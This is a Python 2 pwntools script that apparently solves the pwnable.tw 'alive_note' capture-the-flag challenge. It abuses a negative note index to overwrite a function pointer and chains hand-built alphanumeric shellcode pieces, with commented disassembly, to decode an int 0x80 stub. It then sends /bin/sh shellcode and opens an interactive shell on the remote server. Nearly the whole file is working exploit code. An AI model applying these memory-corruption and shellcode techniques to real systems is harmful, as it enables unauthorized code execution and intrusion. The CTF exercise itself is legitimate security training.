#!/usr/bin/env python2
from pwn import *
context(arch = 'i386', os = 'linux')

ready = True
if ready:
    conn = remote('chall.pwnable.tw', 10300)
else:
    conn = process(argv = ['/home/doublesine/Desktop/alive_note'])

def Sendraw(s):
    conn.send_raw(s)
    print(s)

def Sendline(s):
    conn.sendline(s)
    print(s)

def AddNote(index, name):
    Sendraw('1\x00')
    print conn.read(),
    Sendraw('%d\x00' % index)
    print conn.read(),
    Sendraw(name)
    print conn.readline(),

def ShowNote(index):
    Sendraw('2\x00')
    print conn.read(),
    Sendraw('%d\x00' % index)
    recv = conn.readline()
    print recv,
    return recv

def DeleteNote(index):
    Sendraw('3\x00')
    print conn.read(),
    Sendraw('%d\x00' % index)

# shellcode 1   +0x0
# +0x0:     P       push eax
# +0x1:     Y       pop ecx
# +0x2:     jz      push 0x7a
# +0x4:     Z       pop edx
# +0x5:     S       push ebx
# +0x6:     u8      jne 0x3a
# shellcodd 2   +0x10
# +0x10:    4F      xor al, 0x46           ;al = 0xb9
# +0x12:    0A5     xor byte ptr[ecx+0x35], al
# +0x15:    S       push ebx
# +0x16:    u8      jne 0x3a
# shellcode 3   +0x20
#           fuck
# shellcode 4   +0x30
# +0x30:    X       pop eax
# +0x31:    43      xor al, 0x33
# +0x33:    40      xor al, 0x30
# +0x35:    t9      int 0x80 = \xcd \x80 = (\x74\x39 ^ \xb9\xb9)
# +0x37:    
# shellcode 5   +0x40
# +0x40:    X       pop eax
# +0x41:    H       dec eax
# +0x42:    0AF     xor byte ptr[ecx+0x46], al
# +0x45:    u6      jne 0xcb = \x75 \xc9 =  \x75 (\x36 ^ \xff)
# +0x47:    
# shellcode 6   +0x50
# +0x50:    0A6     xor byte ptr[ecx+0x36], al
# +0x53:    0AW     xor byte ptr[ecx+0x57], al
# +0x56:    ua      jne 0xda = \x75 \xd8 = \x75 (\x61 ^ \xb9)
shellcode1 = 'PYjzZSu8'
shellcode2 = '4F0A5Su8'
shellcode3 = 'fuck'
shellcode4 = 'X4340t9'
shellcode5 = 'XH0AFu6'
shellcode6 = '0A60AWua'
shellcode = asm(shellcraft.sh())

sleep(0.5)
print conn.read(),
AddNote(-27, shellcode1)
print conn.read(),
AddNote(0, shellcode2)
print conn.read(),
AddNote(1, shellcode3)
print conn.read(),
AddNote(2, shellcode4)
print conn.read(),
AddNote(3, shellcode5)
print conn.read(),
AddNote(4, shellcode6)

print conn.read(),
DeleteNote(-27)
conn.send_raw(0x37 * 'A' + shellcode)
conn.interactive()
